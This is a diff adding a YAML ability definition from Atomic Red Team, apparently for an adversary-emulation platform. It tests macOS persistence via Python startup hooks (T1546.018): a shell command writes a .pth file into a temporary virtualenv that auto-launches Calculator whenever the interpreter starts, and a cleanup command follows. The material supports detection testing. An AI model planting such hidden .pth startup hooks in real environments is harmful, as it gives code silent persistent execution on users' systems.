@@ -1,0 +1,50 @@
+- id: 858b4aed-d76f-443d-a801-5454ea56dee0
+  name: Python Startup Hook Execution via .pth (macOS)
+  description: Creates a Python startup hook using a .pth file inside a virtual environment
+    on macOS.
+  tactic: persistence
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    darwin:
+      sh:
+        command: PYTHON_EXE=$(command -v python3); TEMPDIR=$(mktemp -d /tmp/atomic_python_hook_XXXXXX);
+          echo "$TEMPDIR" > /tmp/atomic_python_hook_path.txt; $PYTHON_EXE -m venv
+          "$TEMPDIR/env"; SITE_PACKAGES=$("$TEMPDIR/env/bin/python" -c "import site;
+          print(site.getsitepackages()[0])"); echo "import subprocess; subprocess.Popen(['open',
+          '-a', 'Calculator'])" > "$SITE_PACKAGES/atomic_hook.pth"; "$TEMPDIR/env/bin/python"
+          -c "print('Interpreter started')"
+        cleanup: pkill "#{exe_name}" || true; [ -f /tmp/atomic_python_hook_path.txt
+          ] && rm -rf $(cat /tmp/atomic_python_hook_path.txt) && rm -f /tmp/atomic_python_hook_path.txt
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1546.018
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      exe_name:
+        description: App to launch
+        type: string
+        default: Calculator
+      python_path:
+        description: Path to Python interpreter
+        type: path
+        default: python3
+    dependencies:
+    - description: Ensure Python is installed
+      prereq_command: command -v
+      get_prereq_command: 'echo "Python3 not found. Please install it using Homebrew
+        (''brew install python'') or the macOS developer tools (''xcode-select --install'')."
+
+        '
+    technique_created: '2025-05-22T19:20:46.740Z'
+    atomic_guid: 858b4aed-d76f-443d-a801-5454ea56dee0
+    import_timestamp: '2026-01-08T03:30:14.133419Z'
